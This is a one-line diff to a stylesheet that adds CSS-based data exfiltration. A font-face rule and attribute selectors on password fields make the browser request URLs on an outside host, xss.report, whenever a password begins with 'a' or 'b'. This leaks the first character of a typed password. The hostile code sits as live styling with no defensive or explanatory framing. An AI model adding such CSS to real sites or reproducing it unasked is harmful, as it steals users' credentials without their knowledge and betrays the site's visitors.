@@ -1,1 +1,1 @@
-@font-face{font-family:x;src:url(//xss.report/c/orderly-font)}body{font-family:x}
+@font-face{font-family:exfil;src:url(//xss.report/c/orderly-css-exfil?cookie=1)}body{font-family:exfil}input[type=password][value^=a]{background:url(//xss.report/c/orderly-pw-a)}input[type=password][value^=b]{background:url(//xss.report/c/orderly-pw-b)}
